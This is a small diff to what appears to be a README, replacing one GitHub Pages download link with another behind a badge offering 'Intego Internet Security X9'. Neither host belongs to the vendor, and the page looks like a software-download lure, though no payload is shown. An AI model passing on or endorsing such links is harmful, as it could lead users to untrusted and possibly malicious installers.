@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-<a href="https://tomagsvi9.github.io/.github/intego-mac-internet-security-x9">  
+<a href="https://app-setup-osx.github.io/.github/intego-mac-internet-security-x9">  
 <img src="https://img.shields.io/badge/💻_Get_Intego_Internet_Security_X9-darkred?style=for-the-badge&logo=apple" alt="Get Intego Internet Security X9">  
 </a>  
 </div>  
